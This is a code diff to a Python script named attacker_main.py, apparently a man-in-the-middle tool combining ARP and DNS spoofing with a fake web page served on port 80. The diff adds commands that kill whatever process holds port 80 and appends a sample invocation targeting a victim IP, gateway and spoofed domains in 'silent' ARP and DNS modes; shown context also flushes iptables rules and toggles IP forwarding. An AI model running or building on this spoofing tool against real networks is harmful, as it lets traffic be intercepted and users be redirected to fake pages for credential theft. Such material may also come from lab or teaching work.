@@ -10,6 +10,7 @@ FAKE_PAGE_PATH = "index.html"
 
 # --- Fake Page setup ---
 def start_fake_server():
+    os.system("fuser -k 80/tcp")  # kills existing process on that port (if there is)
     print("+++ Starting fake web server on port 80...")
     cmd = ["python", "-m", "SimpleHTTPServer", "80"]
     return subprocess.Popen(cmd, stdout=open(os.devnull, 'wb'), stderr=subprocess.STDOUT)
@@ -35,6 +36,7 @@ def cleanup():
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     os.system("iptables -F")
     os.system("iptables -t nat -F")
+    os.system("fuser -k 80/tcp")  # kills fake page (on port 80)
     print("---> All cleaned. Exiting.")
 
 
@@ -114,3 +116,15 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
+##################################
+# Example command to run the script:
+# sudo python attacker_main.py \
+#   --iface enp0s3 \
+#   --victim 192.168.56.101 \
+#   --gateway 192.168.56.102 \
+#   --target-domains example.com\
+#   --spoof-ip 192.168.56.103 \
+#   --arp-mode silent \
+#   --dns-mode silent
